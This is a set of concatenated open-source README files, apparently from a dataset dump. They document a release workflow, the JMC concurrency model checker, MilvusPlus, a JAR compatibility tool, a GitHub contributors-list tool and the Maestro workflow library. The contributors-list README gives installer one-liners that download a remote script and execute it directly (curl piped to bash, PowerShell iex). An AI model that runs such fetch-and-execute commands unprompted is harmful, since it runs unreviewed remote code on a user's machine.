        </addColumn>
    </changeSet>

### Frontend environment

To build individual the frontend (in production mode), run the following command:

    task genie:frontend:build

And you can launch the frontend in dev mode with:

    task genie:frontend:start

Then you need to start the backend with the following command:

    task genie:backend:start

Use `npm` and `npx` wrappers to manually run any command like `./npm run start` or `./npx webpack`.

## Release a new version

To release a new version, run the following command:

    task release

The release automation:

* updates the version in the `pom.xml` file,
* updates the version in the `package.json`/`package-lock.json` file,
* updates the CHANGELOG.md file,
* commits the changes,
* tags the commit,
* proposes to push the commit and the tag to the remote repository.

`task release` is selecting the next version (`X.Y.Z`) based on changes since the last release.

It is following the [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) convention.

If there is a commit with a breaking change it will increase to the next major version (X) :

> **BREAKING CHANGE:** a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

else if a commit contains a feature it will increase to the next feature version (Y):

> **feat:** a commit of the _type_ `feat` introduces a new feature to the codebase (this correlates with [**`MINOR`**](http://semver.org/#summary) in Semantic Versioning).

otherwise it will increase to the next patch version (Y):

> **fix:** a commit of the _type_ `fix` patches a bug in your codebase (this correlates with [**`PATCH`**](http://semver.org/#summary) in Semantic Versioning).
>
> types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others.

**Rollback a release:** After release you are asked to confirm to push the release commit and tag to gitlab. You can always refuse it and cancel the release by removing the release commit (`git reset --hard HEAD~1`) and the tag (`git tag --delete vX.Y.Z`)

You can also manually select the version to release with the following command:

    task release:patch # To force the creation of a patch version
    task release:minor # To force the creation of a minor version
    task release:major # To force the creation of a major version

    task release:alpha # To force the creation of a pre-release alpha version (X.Y.Z-alpha.N)
    task release:beta # To force the creation of a pre-release beta version (X.Y.Z-beta.N)

## Conventional Commits

We are using [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for commit messages.

The commit message should be structured as follows:

    <type>[optional scope]: <description>

    [optional body]

    [optional footer(s)]

Common types are:

* **Feature (`feat`)**: A commit of this type introduces a new feature to the codebase. This correlates with a [**`MINOR`**](http://semver.org/#summary) version in Semantic Versioning.
* **Fix (`fix`)**: A commit of this type patches a bug in your codebase. This correlates with a [**`PATCH`**](http://semver.org/#summary) version in Semantic Versioning.
* **Documentation (`docs`)**: A commit of this type only affects documentation.
* **Refactor (`refactor`)**: A commit of this type involves code refactoring, which neither fixes a bug nor adds a feature.
* **Style (`style`)**: A commit of this type pertains to formatting, white-space, or other changes that do not affect the meaning of the code.
* **Chore (`chore`)**: A commit of this type includes changes that do not relate to a fix or feature and do not modify source or test files. For example, updating dependencies.
* **Performance (`perf`)**: A commit of this type enhances performance.
* **Test (`test`)**: A commit of this type either adds missing tests or corrects existing tests.
* **Build (`build`)**: A commit of this type affects the build system or external dependencies. Example scopes include gulp, broccoli, npm.
* **Continuous Integration (`ci`)**: A commit of this type affects the continuous integration system configuration.
* **Revert (`revert`)**: A commit of this type reverts a previous commit.

**BREAKING CHANGE**: a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

Optional scopes can be anything specifying the place of the commit change. For example, it can be the reference of a ticket like `#1234`.

Example:

    feat(#1234): allow provided config object to extend other configs

    BREAKING CHANGE: `extends` key in config file is now used for extending other config files

    closes #1234
",0,1,3,mit,7.0
mpi-sws-rse/jmc,main,"# JMC

The Java Model Checker (JMC) is a tool designed for testing concurrent Java programs. It comes with two main search
strategies to guide the testing process: a random strategy and an optimal DPOR-based stateless model checking strategy
(Trust Strategy). The implementation of DPOR in JMC is based on the Trust algorithm[[1]](#1) with various extensions.
Additionally, JMC includes a replay strategy that can be utilized to replay the execution trace of a concurrent Java
program identified as buggy by JMC.

Please note that this is an early release of the tool for evaluation and all interfaces may change in future versions.

## JMC Capabilities

The current version of JMC is capable of identifying assertion violations and deadlocks that stem from shared resources.

### Detecting Assertion Violations

Within your shared-memory multi-threaded Java program, you can place assertions over shared objects.
When JMC is executed, it will produce various potential execution traces of the program based on the selected search
strategy.
These traces explore different scheduling choices of the threads.
The goal of the exploration is to identify a schedule that violates the assertions.
Upon identifying such a trace, JMC will store it in a file and notify you.
The stored trace can be replayed for debugging.

### Identifying Deadlocks

JMC also keeps track of the acquisition and release of monitors by each thread. In the event of a potential deadlock
within an
execution trace of your program, where one thread is waiting for a monitor held by another thread, and the other thread
is waiting for a monitor held by the first thread, JMC will recognize this deadlock, save the trace as a file, and
notify
you accordingly. The trace can be replayed.

### Debugging

JMC can serve as a tool for debugging concurrent programs. If you have a concurrent Java program that you suspect may
contain an
assertion violation or deadlock, you can use JMC to test your program and identify any problematic execution traces.
Subsequently, you can employ the replay strategy to reenact the execution of the problematic trace and debug your
program.

## Using JMC

The current version of JMC does not include jar files. To use JMC, follow these steps:

1. Clone the repository and open the project in an IDE like IntelliJ IDEA.
2. Build the project.
3. Run predefined tests located in the `src/test/java/org/mpisws/checker/ModelCheckerTest.java` class.

In the `ModelCheckerTest.java` class, each test case is represented as a method for testing a concurrent Java program.
Each test case is annotated with `@Test`, indicating that it is a JUnit test case.

For each test case, follow these steps:

- Create a `TestTarget` object and initialize it with the package name, class name, method name, and the path to the
  Java program you want to test.
- Set your desired configuration for the testing process using the `checker` object, which is an instance of the
  `ModelChecker` class responsible for running the testing process. It contains a `CheckerConfiguration` object for
  setting the configuration parameters for the testing process, including:
    - `int maxIterations`: the maximum number of iterations to run the testing process (default value: `10`).
    - `long seed`: the seed for the random number generator (default value: `new Random().nextLong()`).
    - `StrategyType strategyType`: the strategy to use for the testing process (default value: `StrategyType.RANDOM`).
      You can change it to `StrategyType.TRUST` to use the trust strategy and `StrategyType.REPLAY` to replay the buggy
      trace.
    - `String buggyTracePath`: the path to save and load the buggy trace, used by the random strategy to save the
      potential buggy trace found during the testing process, and by the replay strategy to load and replay the
      execution
      of the buggy trace (default value: `src/main/resources/buggyTrace/`).
    - `String buggyTraceFile`: the name of the file containing the buggy trace (default value: `buggyTrace.obj`).
    - `String executionGraphsPath`: the path to save the .dot and .png files of generated execution graphs during the
      testing process under trust strategy. This field should be ignored when using the random and replay strategies
      (default value: `src/main/resources/Visualized_Graphs/`).

Once the configuration parameters are set, call the `checker.check()` method to initiate the testing process.

## Limitations of JMC

The current version of JMC is an early release, and has many limitations:

- Currently, JMC only accepts the `main` method as the entry point for the program. If your program does not contain a
  main method, you must create one to serve as the entry point for a JMC test.

- Your program must use the Java Thread class to define and create threads exclusively. Thread creation must be
  accomplished by defining classes that extend the `Thread` class. Alternative methods, such as using the `Runnable`
  interface, Thread Factory, or any other means to create threads, are not supported.

- Overriding the `run()` method of the `Thread` class as a lambda expression is prohibited. The `run()` method must be
  defined in the same class that extends the `Thread` class. using lambda expressions to instantiate
  threads is also prohibited.

- Use of features from the `java.util.concurrent` package is not allowed. Only the `Thread` class may be used to create
  threads. Synchronization of threads can be achieved using the `synchronized` block and `join()` method. We also do not
  support
  additional concurrency interfaces such as `Executor`s or `Future`s.
  Using any other features may lead to inaccurate results in the testing process.

- Avoid using spin loops for synchronization purposes.

We expect to handle these features in future releases.

## Running the Project

This project uses Java's `assert` statement, so you need to enable assertions when running the project. If you're using
IntelliJ IDEA, follow these steps:

1. Go to `Run` -> `Edit Configurations...`
2. In the `Configuration` tab, find the `VM options` field.
3. Enter `-ea` in the `VM options` field.
4. Click `Apply` and then `OK`.

Now, when you run the project, assertions will be enabled.
Without these flags, asserts are silently ignored.

## Examples

In this section, we provide two examples of concurrent Java programs run on JMC.
One of them contains a data race over a shared object which leads to an assertion violation.
The other contains a deadlock in using monitors.

### Inconsistent Simple Concurrent Counter

Let's consider a Java program that creates two threads and shares a counter between them. Each thread increments the
counter and then spawns a new helping thread to further increment the counter. The program is outlined below:

```java
public class SimpleCounter extends Thread {

    private final Counter counter;

    public SimpleCounter(Counter count) {
        this.counter = count;
    }

    @Override
    public void run() {
        counter.increment();
        HelpingThread helpingThread = new HelpingThread(counter);
        helpingThread.start();
    }

    public static void main(String[] args) {
        Counter counter = new Counter();
        SimpleCounter thread1 = new SimpleCounter(counter);
        SimpleCounter thread2 = new SimpleCounter(counter);
        thread1.start();
        thread2.start();
        try {
            thread1.join();
            thread2.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        assert counter.getValue() == 4 : ""Counter value is not 4"";
        System.out.println(""Counter value is 4"");
    }
}
```

Where the Counter class is defined as follows:

```java
public class Counter {
    private int count = 0;

    public int getValue() {
        return count;
    }

    public void increment() {
        count++;
    }
}
```

And the HelpingThread class is defined as follows:

```java
public class HelpingThread extends Thread {

    Counter counter;

    HelpingThread(Counter counter) {
        this.counter = counter;
    }

    @Override
    public void run() {
        counter.increment();
    }
}
```

As expected, the counter value should be 4 at the end of the program. Nevertheless, owing to the data race
concerning the `counter` object, the counter value may not reach 4.

This program is located in the `src/main/java/org/mpisws/concurrent/programs/simple/counter/` package. To test this
program using JMC, you can create a test case in the `ModelCheckerTest.java` class as illustrated below:

```java

@Test
@DisplayName(""A concurrent counter using nested thread spawning - Random"")
void randomTestSimpleCounter() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.simple.counter"",
            ""SimpleCounter"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/simple/counter/""
    );
    System.out.println(""SimpleCounter Random Strategy Started"");
    checker.configuration.strategyType = StrategyType.RANDOM;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    assertTrue(checker.check(t), ""SimpleCounter Random Strategy Finished"");
}
```

When you execute this test case, you will observe messages in the console detailing how JMC is scheduling the threads
and the outcome of each execution iteration. Since the strategy is configured as RANDOMSTRAREGY, JMC may not identify
the execution trace that violates the assertion. If JMC attempts to check the program multiple times and reaches the
default maximum number of iterations (10 by default) without discovering the buggy trace, it will display a message
indicating that the buggy trace was not found, as shown below:

```
[Runtime Environment Message] : The 10 execution is finished
[Runtime Environment Message] : The maximum number of the executions is reached
[Bytecode Manager Message] : The Halt Execution Exception happened
[Bytecode Manager Message] : The Model Checking process has finished
[Bytecode Manager Message] : The program is thread-safe
```

If you execute the test case multiple times, you may discover that JMC will eventually uncover the buggy trace. In this
particular example, we did not specify a seed for the random number generator, thus JMC will utilize a random seed for
each execution. Once JMC identifies the buggy trace, it will store it in the `src/main/resources/buggyTrace/` directory
under the name `buggyTrace.obj`. Additionally, it will display the trace in the console. An example of a buggy trace
that
JMC may uncover is provided below:

[Search Strategy Message] : 18.FailureEvent(type=FAILURE, tid=1, serial=5)
[Random Strategy Message] : Buggy execution trace is saved in src/main/resources/buggyTrace/buggyTrace.obj
```

Each line of the trace depicts a recorded event, comprising the thread ID, event type, serial number, value, and
location.
For instance, in event 17, the counter value is recorded as 2, which violates the assertion specifying that the counter
value should be 4. The thread with ID 1 is the main thread of the program, the thread with ID 2 is the first spawned
thread, and so on. The `FailureEvent` indicates that the assertion was violated in the execution trace. JMC will store
this trace in the `src/main/resources/buggyTrace/` directory under the name `buggyTrace.obj`. You can now employ the
replay strategy to reenact the buggy trace and debug your program. To do so, you can create a test case in the
`ModelCheckerTest.java` class as demonstrated below:

```java

@Test
@DisplayName(""A concurrent counter using nested thread spawning - Replay"")
void replayTestSimpleCounter() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.simple.counter"",
            ""SimpleCounter"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/simple/counter/""
    );
    System.out.println(""SimpleCounter Replay Strategy Started"");
    checker.configuration.strategyType = StrategyType.REPLAY;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    assertTrue(checker.check(t), ""SimpleCounter Replay Strategy Finished"");
}
```

Upon executing this test case, JMC will replay the buggy trace and present the identical execution trace in the console,
as depicted earlier. You can utilize this trace to debug your program and pinpoint the origin of the data race.

Moreover, you can use the Trust strategy to test the program. To do so, you can create a test case in the
`ModelCheckerTest.java` class as demonstrated below:

```java

@Test
@DisplayName(""A concurrent counter using nested thread spawning - Trust"")
void trustTestSimpleCounter() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.simple.counter"",
            ""SimpleCounter"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/simple/counter/""
    );
    System.out.println(""SimpleCounter Trust Strategy Started"");
    checker.configuration.strategyType = StrategyType.TRUST;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    checker.configuration.executionGraphsPath = ""src/main/resources/Visualized_Graphs/"";
    assertTrue(checker.check(t), ""SimpleCounter Trust Strategy Finished"");
}
```

By executing this test case, output messages similar to the random strategy will be displayed in the console.
Additionally, JMC will generate execution graphs, each representing an equivalent class of execution traces. Using the
trust strategy, JMC will generate all possible execution graphs at runtime and execute the program based on these
classes.
If an assertion is violated in any of representative execution trace of the equivalent classes, JMC will store the buggy
trace and return it. If no assertion violation is found in any of the classes, JMC will return a message indicating
that the program is thread-safe.

Since the SimpleCounter class contains a data race on the shared counter object, there exists a buggy trace that
violates the assertion. The trust strategy employed by JMC will eventually identify this buggy trace. One of the
execution
graphs that leads to the assertion violation which is found by JMC for for the SimpleCounter is as follows:

![Graph Visualization](sampleGraph.png)

Also, JMC will store the found buggy trace by the trust strategy, and it is possible to replay the buggy trace and debug
the program.

### Dining Philosophers with Deadlock

Let's consider a Java program that simulates the dining philosophers problem. The program creates five philosophers,
each
represented as a thread, and five forks, each represented as a monitor object. Each philosopher first thinks, then
tries to eat by acquiring the right fork and consequently the left fork. After acquiring both forks, the philosopher
eats and then releases
the forks. The program is outlined below:

```java
import java.util.ArrayList;
import java.util.List;

public class DiningPhilosophers {

    public static void main(String[] args) {
        final int NUM_PHILOSOPHERS = 5;

        List<Philosopher> philosophers = new ArrayList<>(NUM_PHILOSOPHERS);
        List<Object> sticks = new ArrayList<>(NUM_PHILOSOPHERS);

        for (int i = 0; i < NUM_PHILOSOPHERS; i++) {
            sticks.add(new Object());
        }

        for (int i = 0; i < NUM_PHILOSOPHERS; i++) {
            Object leftFork = sticks.get(i);
            Object rightFork = sticks.get((i + 1) % NUM_PHILOSOPHERS);
            philosophers.add(new Philosopher(i, leftFork, rightFork));
        }

        for (Philosopher philosopher : philosophers) {
            philosopher.start();
        }

        for (Philosopher philosopher : philosophers) {
            try {
                philosopher.join();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }
}
```

Where the Philosopher class is defined as follows:

```java
public class Philosopher extends Thread {
    private final int id;
    private final Object leftStick;
    private final Object rightStick;

    public Philosopher(int id, Object leftFork, Object rightFork) {
        this.id = id;
        this.leftStick = leftFork;
        this.rightStick = rightFork;
    }

    private void think() throws InterruptedException {
        System.out.println(""Philosopher "" + id + "" is thinking."");
    }

    private void tryToEat() throws InterruptedException {
        synchronized (rightStick) {
            synchronized (leftStick) {
                eat();
            }
            System.out.println(""Philosopher "" + id + "" has put down the left stick."");
        }
        System.out.println(""Philosopher "" + id + "" has put down the right stick."");
    }

    private void eat() throws InterruptedException {
        System.out.println(""Philosopher "" + id + "" is eating."");
    }

    @Override
    public void run() {
        try {
            think();
            tryToEat();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
```

In this program, there is a subtle scenario that can potentially result in a deadlock. If each philosopher sequentially
picks up the right fork and then waits for the left fork, a deadlock will ensue. In other words, when each philosopher
holds a fork (monitor) and awaits the release of the other fork (monitor) a deadlock will happen. The program can be
found in the `src/main/java/org/mpisws/concurrent/programs/dining/` package. To test this program using JMC, you can
create a test case in the `ModelCheckerTest.java` class as demonstrated below:

```java

@Test
@DisplayName(""Dining philosophers problem with deadlock - Random"")
void randomTestDiningPhilosophers() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.dining"",
            ""DiningPhilosophers"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/dining/""
    );
    System.out.println(""DiningPhilosophers Random Strategy Started"");
    checker.configuration.strategyType = StrategyType.RANDOM;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    assertTrue(checker.check(t), ""DiningPhilosophers Random Strategy Finished"");
}
```

Just like the previous example, when you execute this test case, you will observe messages in the console detailing how
JMC is scheduling the threads and the outcome of each execution iteration. Since the strategy is configured as
RANDOMSTRAREGY, JMC may not identify the execution trace that violates the assertion. If JMC attempts to check the
program multiple times and reaches the default maximum number of iterations (10 by default) without discovering the
buggy trace, it will display a message indicating that the buggy trace was not found. A buggy trace that
JMC may uncover is provided below:

[Random Strategy Message] : Buggy execution trace is saved in src/main/resources/buggyTrace/buggyTrace.obj
```

The trace demonstrates that the program has reached a deadlock. The `DeadlockEvent` indicates that a deadlock has
occurred
in the execution trace. JMC will store this trace in the `src/main/resources/buggyTrace/` directory under the name
`buggyTrace.obj`. You can now utilize the replay strategy to reenact the buggy trace and debug your program. To do so,
you can create a test case in the `ModelCheckerTest.java` class as demonstrated below:

```java

@Test
@DisplayName(""Dining philosophers problem with deadlock - Replay"")
void replayTestDiningPhilosophers() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.dining"",
            ""DiningPhilosophers"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/dining/""
    );
    System.out.println(""DiningPhilosophers Replay Strategy Started"");
    checker.configuration.strategyType = StrategyType.REPLAY;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    assertTrue(checker.check(t), ""DiningPhilosophers Replay Strategy Finished"");
}
```

Upon executing this test case, JMC will replay the buggy trace and present the identical execution trace in the console,
as depicted earlier. You can utilize this trace to debug your program and pinpoint the origin of the deadlock.

Finding the deadlock using the Trust strategy is also possible. To do so, you can create a test case in the
`ModelCheckerTest.java` class as demonstrated below:

```java

@Test
@DisplayName(""Dining philosophers problem with deadlock - Trust"")
void trustTestDiningPhilosophers() {
    var t = new TestTarget(""org.mpisws.concurrent.programs.dining"",
            ""DiningPhilosophers"",
            ""main"",
            ""src/test/java/org/mpisws/concurrent/programs/dining/""
    );
    System.out.println(""DiningPhilosophers Trust Strategy Started"");
    checker.configuration.strategyType = StrategyType.TRUST;
    checker.configuration.buggyTracePath = ""src/main/resources/buggyTrace/"";
    checker.configuration.buggyTraceFile = ""buggyTrace.obj"";
    checker.configuration.executionGraphsPath = ""src/main/resources/Visualized_Graphs/"";
    assertTrue(checker.check(t), ""DiningPhilosophers Trust Strategy Finished"");
}
```

Using the trust strategy, JMC will generate all possible execution graphs at runtime and execute the program based on
these classes. If a deadlock is found in any of the representative execution traces of the equivalent classes, JMC will
store the buggy trace and return it. If no deadlock is found in any of the classes, JMC will return a message indicating
that the program is deadlock-free.

Since the DiningPhilosophers class contains a deadlock, the trust strategy employed by JMC will eventually identify this
deadlock. One of the execution graphs that leads to the deadlock which is found by JMC for the DiningPhilosophers
with `NUM_PHILOSOPHERS =3`
is as follows:

![Graph Visualization](sampleGraph2.png)

Indeed, JMC will store the found buggy trace by the trust strategy, and it is possible to replay the buggy trace and
debug the program.

## Project Introduction

<div style=""display: inline-block; border: 4px solid #ccc; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin: 10px; padding: 10px;"">
  <img src=""./logo/milvus.png"" alt=""MilvusPlus"" style=""border-radius: 10px;"" />
</div>

> 🔥🔥🔥 [MilvusPlus](https://milvusplus.cn/) (short for MP) is an operational tool for [Milvus](https://milvus.io), designed to simplify interactions with the Milvus vector database, providing developers with an intuitive API similar to MyBatis-Plus annotations and method call style, born to improve efficiency.

## Features

- **Non-Invasive**: It only enhances without making changes; its introduction will not affect existing projects, as smooth as silk.
- **Low Overhead**: It automatically injects basic CRUD operations upon startup, with almost no performance loss, and operates directly on objects.
- **Powerful CRUD Operations**: The universal MilvusMapper can achieve CRUD operations with just a small amount of configuration, and has a powerful condition builder to meet all kinds of usage needs.
- **Intuitive API**: The direct API design simplifies database operations, and MilvusService provides a rich API.
- **Support for Lambda-style Calls**: Lambda expressions make it easy to write various query conditions without worrying about field errors.
- **Support for Automatic Primary Key Generation**: Perfectly solves the primary key issue.
- **Support for Custom Global Operations**: Supports global method injection.
- **Annotation-based Configuration**: Uses an annotation method similar to MyBatis-Plus to configure entity models.
- **Easy to Extend**: The core design focuses on extensibility.
- **Type Safety**: Uses Java type safety to reduce errors.

## Quick Start

Custom extension support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-core</artifactId>
    <version>2.1.6</version>
</dependency>
```

Spring application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-boot-starter</artifactId>
    <version>2.1.6</version>
</dependency>
```

Solon application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-solon-plugin</artifactId>
    <version>2.1.6</version>
</dependency>
```

## Notes

- Version 2.0.0 requires the use of index annotations to define indexes; otherwise, an error will occur at startup, and adding them later will be ineffective, requiring the collection to be deleted first.
- Version 2.0.0 has not yet released the MilvusService functionality.

## Configuration File

```
milvus:
  uri: https://in03-a5357975ab80da7.api.gcp-us-west1.zillizcloud.com
  token: x'x'x'x
  enable: true
  packages:
    - com.example.entity
```

- `milvus`: Defines configurations related to the Milvus service.
    - `uri`: The URI of the Milvus service, through which the application communicates with the Milvus service.
    - `token`: A token for verification and authorization, ensuring the security of access to the Milvus service.
    - `enable`: A boolean value indicating whether the Milvus module should be enabled.
    - `packages`: These packages contain Java classes corresponding to custom annotations, which you can consider as the package where your custom entity classes are located.

## Application Scenarios

- **Similarity Search**: Quickly retrieve items most similar to a given vector.
- **Recommendation System**: Recommend relevant content based on user behavior and preferences.
- **Image Retrieval**: Find the most similar images to the query image in a large-scale image library.
- **Natural Language Processing**: Convert text into vectors and perform semantic searches.
- **Bioinformatics**: Analyze and compare biological sequences, such as protein and genomic data.

## Detailed Explanation of Custom Annotations

Using custom annotations to automate the integration of the Milvus database provides the following significant advantages:

- **Simplifies the Development Process**: The database structure is declared directly in the code through annotations, without the need to manually create collections, attributes, indexes, and partitions. The project starts automatically and builds, reducing the need to manually write Milvus API calls.
- **Improves Development Efficiency**: The annotation-driven approach makes the creation and management of the database structure more convenient, speeding up development.
- **Enhances Code Readability**: Tightly integrates the definition of the database structure with business logic code, improving the readability and maintainability of the code.
- **Reduces Errors**: Automated creation of the database structure reduces the possibility of human errors, improving the stability of the system.

threedr3am/jar-compatibility-detector,master,"# Jar兼容性检测工具

这是一个用于检测Java Archive (JAR) 包之间兼容性的工具。它可以帮助开发者分析在不同JAR包集合中评估不同JAR包组合的兼容性。

## 功能特点

- 分析指定JAR包或目录下所有JAR包中的**类方法调用**，检测方法调用中是否存在未定义的被调用者。
- 分析指定JAR包或目录下所有JAR包中的**类字段引用**，检测字段引用中是否存在未定义的被引用字段。
- 分析指定JAR包或目录下所有JAR包中的**注解引用**，检测注解引用中是否存在未定义的被引用注解。
- 支持多种JRE版本，确保分析的准确性。

## 使用方法

要使用此工具，您需要在命令行中运行以下命令，并传入相应的参数（注意，运行目录需要有JREs，以提高检测准确性！）：

```bash
java -jar CompatibilityDetector-1.0-SNAPSHOT.jar --target <path> --javaVersion <version> --package <package>
```

### 参数说明

- `--target <path>`: 指定需要分析的JAR包或包含JAR包的目录的路径。
- `--javaVersion <version>`: 指定工具使用的JRE版本。可取值为3、4、5、6、7、8。
- `--package <package>`: 指定需要特别关注的目标包。例如，如果您想检测`logback`的兼容性，可以使用`--package ch.qos.logback`。
- `--jar <jar>`: 指定需要特别关注的目标jar。例如，如果您想检测`logback.jar`的兼容性，可以使用`--jar /path/to/jars/logback.jar`。

## 示例

假设您想检测位于`/path/to/jars`目录下所有JAR包的兼容性，并且特别关注`logback`包，您可以使用以下命令：

```bash
java -jar CompatibilityDetector.jar --target /path/to/jars --javaVersion 8 --package ch.qos.logback
```
or
```bash
java -jar CompatibilityDetector.jar --target /path/to/jars --javaVersion 8 --jar /path/to/jars/logback.jar
```

## 兼容性分析

工具将分析所有指定JAR包中的类方法调用，并报告任何不兼容的情况，例如调用了不存在的方法或类。

## 注意事项

- 确保指定的JAR包或目录路径正确无误。
- 根据需要选择合适的JRE版本进行分析。
- 工具可能需要一些时间来完成分析，具体取决于JAR包的数量和大小。

koppor/github-contributors-list,main,"# GitHub Contributors List

Builds a contributor list based on information available on GitHub.
It reads the information of pull requests including the `Co-authored-by:` notes in commit messages.

GitHub's API [does NOT include users listed as ""Co-authored-by:""](https://github.com/orgs/community/discussions/46421).
Thefore, the commit messages need to parsed ""manually"".

It is a rewrite of [github-contributors-list](https://github.com/mgechev/github-contributors-list) to [support `Co-authored-by:`](https://github.com/mgechev/github-contributors-list/issues/26).

## Example

See <https://blog.jabref.org/2024/04/03/JabRef5-13/#special-thanks> for real-world usage.

## How to use

1. [Install jbang](https://www.jbang.dev/documentation/guide/latest/installation.html#using-jbang).
   E.g.,
   - Linux/macOS: `curl -Ls https://sh.jbang.dev | bash -s - app setup` or
   - Windows (Powershell): `iex ""& { $(iwr -useb https://ps.jbang.dev) } app setup""`
2. Add `oauth=...` to `~/.github` with `...` being your [GitHub personal access token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-personal-access-token-classic). See [GitHub API for Java](https://github-api.kohsuke.org/) for details.
3. `cd` to the repository you want to analyze.
4. `jbang gcl@koppor/github-contributors-list`

```terminal
Usage: jbang gcl@koppor/github-contributors-list [-lhV] [--startrevision=<startCommitRevStr>]
           [--endrevision=<endCommitRevStr>] [--repository=<ownerRepository>]
           [--cols=<cols>] [--filter=<ignoredUsers>]...
           [--filter-emails=<ignoredEmails>]... [-m=<String=String>]...
           [<repositoryPath>]
      [<repositoryPath>]     The path to the git repository to analyse.
      --cols=<cols>          Number of columns
      --endrevision=<endCommitRevStr>
                             The last revision to check (tag or commit id).
                               Included.
      --filter=<ignoredUsers>

      --filter-emails=<ignoredEmails>

  -h, --help                 Show this help message and exit.
  -l, --[no-]github-lookup   Should calls be made to GitHub's API for user
                               information
  -m, --login-mapping=<String=String>
                             Mapping of GitHub logins to names. Format:
                               name=login
      --repository=<ownerRepository>
                             The GitHub repository in the form
                               owner/repostiory. E.g., JabRef/jabref
      --startrevision=<startCommitRevStr>
                             The first revision to check (tag or commit id).
                               Excluded.
  -V, --version              Print version information and exit.
```

Example:

```terminal
Usage: jbang gcl@koppor/github-contributors-list --repository JabRef/jabref c:\git-repositories\jabref --startrevision=v5.13 --endrevision=v5.15
```

At the end, non-found committers are listed.
The format is `<used name> <PR link> <commit link>`.
Example:

```text
Anish.Pal https://github.com/JabRef/jabref/pull/10829 https://github.com/JabRef/jabref/pull/10829/commits/d2d84923df2c6c7d59559da8d583ae17dc803c3d
```

With that information, one can create a mapping from the committer name to the GitHub username.
In this case: `Anish.Pal=pal-anish`

The tool is implemented as single pass over the commits of the repository.
It uses a cache to store the information of contributors.
Thus, repeated runs could update contributor information.
For instance, if a user first appears as ""Co-authored-by:"" and later as a pull request author, the username could be determined better.

In case of issues, try to delete `gcl.mv` to start with a fresh cache.

## FAQ

⚠ In case contributors are not ignored, please delete `gcl.mv` and try again. ⚠

## Implementation details

- `gcl.mv` is an [MVStore](https://www.h2database.com/html/mvstore.html) caching contributor information returned by GitHub's API.
- Dependencies of `gcl.java` cannot be updated automatically. [dependabot-core#9406](https://github.com/dependabot/dependabot-core/issues/9406).
- Use `writer.level = TRACE` in tinylog.properties for debugging.

## Alternatives

- Manually curate all contributors using [All Contributors](https://allcontributors.org/)
- Use [github-contributors-list](https://github.com/mgechev/github-contributors-list) and accept that `Co-authored-by:` is ignored.

### Example app
Take a look at the [example app](./example) for an example of how to create your first durable [workflow](./example/src/main/java/org/example/workflow/OrderWorkflowImpl.java)! 

Start the app with:
```bash
docker compose -f script/docker-compose.yml up --build --force-recreate
```

Then, try calling the app using [requests.http](./example/script/requests.http).

View all of your workflows and workflow events at http://localhost:8000!

### Use Maestro in Your Own Project

1. include `maestro-core` as a dependency in your `build.gradle.kts`:
    ```kotlin
    implementation(""io.github.lucidity-labs:maestro-core:0.1.2"")
    ```
    
    or your `pom.xml`:
    
    ```xml
    <dependency>
        <groupId>io.github.lucidity-labs</groupId>
        <artifactId>maestro-core</artifactId>
        <version>0.1.2</version>
    </dependency>
    ```
   
2. Execute [maestro.sql](./script/maestro.sql) against your Postgres database to create the necessary schema. If you instead want to start off with a ready-to-go local Dockerized Postgres instance, just execute: 
   ```bash 
   docker compose -f script/docker-compose.yml up --build --force-recreate postgres
   ```

3. Write your durable workflow! It's super easy - take a look at the [example app](./example) to see how.

### Write Your First Workflow

1. Create at least one activity interface, like [PaymentActivity](./example/src/main/java/org/example/activity/interfaces/PaymentActivity.java). Activities are like steps of your workflow.
2. Implement your activity, like [PaymentActivityImpl](./example/src/main/java/org/example/activity/impl/PaymentActivityImpl.java).
3. Create a workflow interface, like [OrderWorkflow](./example/src/main/java/org/example/workflow/OrderWorkflow.java). Include a method annotated with `@WorkflowFunction` in this interface.
4. Implement your workflow, like [OrderWorkflowImpl](./example/src/main/java/org/example/workflow/OrderWorkflowImpl.java). You can call the activities you've created earlier by declaring them as fields and annotating the fields with `@Activity`.
5. Register the workflow implementation and the activity implementations, like in [Config](./example/src/main/java/org/example/config/Config.java).
6. Call your workflow, like in [Controller](./example/src/main/java/org/example/api/Controller.java).

